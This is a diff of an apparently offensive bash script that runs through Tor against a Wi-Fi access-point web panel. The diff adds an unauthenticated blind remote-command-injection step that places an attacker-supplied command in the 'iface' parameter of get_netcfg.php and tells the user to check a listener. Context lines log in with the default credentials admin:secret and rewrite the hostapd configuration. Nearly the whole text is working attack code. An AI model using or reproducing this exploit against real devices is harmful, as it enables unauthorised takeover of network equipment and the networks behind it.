@@ -5,7 +5,15 @@ truc=$(torify curl -si  -H "Cookie: PHPSESSID=hey" -H "Referer: lol" $1/app/img/
 echo $truc
 
 name=$(echo $truc | grep -o -P '(?<=WIFI:S:).*(?=;T:)')
+echo "" 
+echo "Unauthenticated Blind RCE (you need a listener or webhook / you also need to encode space -> %20)"
 
+
+torify curl -s "$1/ajax/networking/get_netcfg.php?iface=\$($2)" >/dev/null
+
+echo "" 
+
+echo "Well Terrorists win anyway i guess.. check your listener"
 
 echo ""
 echo "Trying to RCE with default creds admin:secret"
@@ -23,7 +31,7 @@ echo ""
 if [[ $csrf == "" ]] ; then
 
 echo "Login Failed"
-echo "Counter-Terrorist Win (Fuck)"
+echo "Counter-Terrorist Win (No authenticated RCE with fun output :p)"
 exit
 
 fi
@@ -48,3 +56,10 @@ echo "Defusing.."
 rm Boom.*
 
 torify curl -s -u admin:secret -H "Cookie: PHPSESSID=hey" -X POST $1/index.php?page=hostapd_conf -d "csrf_token=$csrf&interface=wlan0&ssid=$name&hw_mode=g&channel=1&wpa=2&wpa_pairwise=CCMP&wpa_passphrase=$pass&beaconintervalEnable=1&beacon_interval=100&max_num_sta=&country_code=FR&SaveHostAPDSettings=Save+settings" >/dev/null
+
+
+
+
+
+
+
